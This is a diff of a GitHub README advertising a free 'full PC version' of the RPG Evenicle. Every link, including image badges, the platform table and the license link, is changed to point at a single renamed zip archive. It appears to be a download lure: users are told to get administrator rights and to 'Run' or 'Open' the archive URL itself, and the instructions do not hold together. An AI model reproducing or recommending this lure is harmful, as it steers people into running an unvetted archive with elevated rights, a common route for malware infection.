@@ -1,6 +1,6 @@
 # Evenicle Adaptation Repository
 
-[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
+[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)
 
 Welcome to the **Evenicle Adaptation Repository**: your one-stop collaborative laboratory for acquiring, exploring, and deploying the renowned RPG experience on a multitude of platforms. Prepare to dive headfirst into the realm of immersive fantasy, tailored for the modern digital voyager and optimized by community innovation!
 
@@ -12,10 +12,10 @@ Take your adventure anywhere! Evenicle's adaptability transcends the boundaries 
 
 | Platform     | Supported | Native Experience | Instructions Provided |
 |--------------|:---------:|:----------------:|:--------------------:|
-| ![Windows](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)           | ✅        | 🎮               | ✔️                  |
-| ![macOS](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)                | ✅        | 🍏               | ✔️                  |
-| ![Linux](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)                | ✅        | 🐧               | ✔️                  |
-| ![Steam Deck](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)           | ✅        | 🎮🚀             | ✔️                  |
+| ![Windows](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)           | ✅        | 🎮               | ✔️                  |
+| ![macOS](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)                | ✅        | 🍏               | ✔️                  |
+| ![Linux](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip%23%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)                | ✅        | 🐧               | ✔️                  |
+| ![Steam Deck](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip%https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)           | ✅        | 🎮🚀             | ✔️                  |
 
 *Effortlessly install and enjoy Evenicle across your chosen digital ecosystem. All critical pathways are mapped below!*
 
@@ -44,7 +44,7 @@ Follow this map to chart your course toward launching Evenicle effortlessly:
    - Confirm you have administrator rights (the keys to your kingdom).
 
 2. **Procure the Treasure:**  
-   - Click the [Download badge](#) or visit https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip  
+   - Click the [Download badge](#) or visit https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip  
    - Choose the “Evenicle Adaptation” archive suited for your platform.
 
 3. **Unpack the Artifacts:**  
@@ -52,8 +52,8 @@ Follow this map to chart your course toward launching Evenicle effortlessly:
    - Verify directory structure for smooth deployment.
 
 4. **Initiate the Adventure:**  
-   - For Windows: Run `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip`
-   - For macOS: Open `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip`
+   - For Windows: Run `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip`
+   - For macOS: Open `https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip`
    - For Linux: Execute `./evenicle` (you may need to `chmod +x evenicle`)
 
 5. **Enjoy Multilingual Wizardry:**  
@@ -102,11 +102,11 @@ This repository is designed for educational and preservationist purposes, servin
 
 ## 📜 MIT License
 
-Licensed under the MIT License (2025). See the full text at: [MIT License](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
+Licensed under the MIT License (2025). See the full text at: [MIT License](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/evenicle-full-pc-version-collection-v2.5.zip)
+[![Download](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)](https://raw.githubusercontent.com/shiv81500/evenicle-full-pc-version-collection/branch/pluripotent/collection_evenicle_version_full_pc_v2.6.zip)
 
 ---
 
